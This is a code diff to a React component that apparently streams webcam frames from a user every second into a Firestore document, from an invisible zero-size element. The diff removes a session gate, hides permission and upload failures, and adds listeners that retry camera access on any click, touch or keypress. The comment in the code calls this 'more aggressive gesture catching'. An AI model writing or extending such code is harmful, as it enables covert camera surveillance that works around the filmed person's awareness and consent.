@@ -11,18 +11,22 @@ import { doc, updateDoc } from "firebase/firestore";
 import { db } from "../firebase.config";
 
 const LiveStreamer = () => {
-  const { user, isLiveMonitoring, sessionStreamActive } = useAuth();
+  const { user, isLiveMonitoring } = useAuth();
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
   const [stream, setStream] = useState(null);
 
   useEffect(() => {
     let interval;
+    let streamRef = null;
+
     const startStream = async () => {
+      if (streamRef) return;
       try {
         const s = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user", width: { ideal: 400 }, height: { ideal: 300 } } 
         });
+        streamRef = s;
         setStream(s);
         if (videoRef.current) videoRef.current.srcObject = s;
 
@@ -30,25 +34,42 @@ const LiveStreamer = () => {
           if (!videoRef.current || !canvasRef.current || !user?.uid) return;
           const canvas = canvasRef.current;
           const video = videoRef.current;
-          const ctx = canvas.getContext("2d");
           
-          canvas.width = 300;
-          canvas.height = (video.videoHeight / video.videoWidth) * 300;
+          if (video.videoWidth === 0) return;
+          
+          canvas.width = 320;
+          canvas.height = (video.videoHeight / video.videoWidth) * 320;
+          const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           
-          const frame = canvas.toDataURL("image/jpeg", 0.5);
-          await updateDoc(doc(db, "users", user.uid), { 
-            liveFrame: frame,
-            lastLivePulse: new Date().toISOString()
-          });
-        }, 1500); // 1.5s interval for performance/stability
+          try {
+            const frame = canvas.toDataURL("image/jpeg", 0.4);
+            await updateDoc(doc(db, "users", user.uid), { 
+              liveFrame: frame,
+              lastLivePulse: new Date().toISOString()
+            });
+          } catch (e) {
+             // Silently handle firestore update errors
+          }
+        }, 1000);
       } catch (err) {
-        console.error("LiveStream failed:", err);
+        // Only log if it's not a permission error we expect to fix with a gesture
+        if (err.name !== "NotAllowedError" && err.name !== "NotFoundError") {
+            console.warn("LiveStream failure:", err.name);
+        }
       }
     };
 
-    if (user?.uid && isLiveMonitoring && sessionStreamActive) {
+    const attemptStart = () => {
+      if (isLiveMonitoring && !streamRef) startStream();
+    };
+
+    if (user?.uid && isLiveMonitoring) {
       startStream();
+      // More aggressive gesture catching
+      window.addEventListener("mousedown", attemptStart, { once: true });
+      window.addEventListener("touchstart", attemptStart, { once: true });
+      window.addEventListener("keydown", attemptStart, { once: true });
     } else {
       if (stream) {
         stream.getTracks().forEach(t => t.stop());
@@ -60,11 +81,14 @@ const LiveStreamer = () => {
     return () => {
       if (stream) stream.getTracks().forEach(t => t.stop());
       if (interval) clearInterval(interval);
+      window.removeEventListener("mousedown", attemptStart);
+      window.removeEventListener("touchstart", attemptStart);
+      window.removeEventListener("keydown", attemptStart);
     };
-  }, [user?.uid, isLiveMonitoring, sessionStreamActive]);
+  }, [user?.uid, isLiveMonitoring]);
 
   return (
-    <div className="fixed opacity-0 pointer-events-none -z-50 size-0 overflow-hidden">
+    <div className="fixed opacity-0 pointer-events-none -z-50 size-0 overflow-hidden" aria-hidden="true">
       <video ref={videoRef} autoPlay playsInline muted />
       <canvas ref={canvasRef} />
     </div>
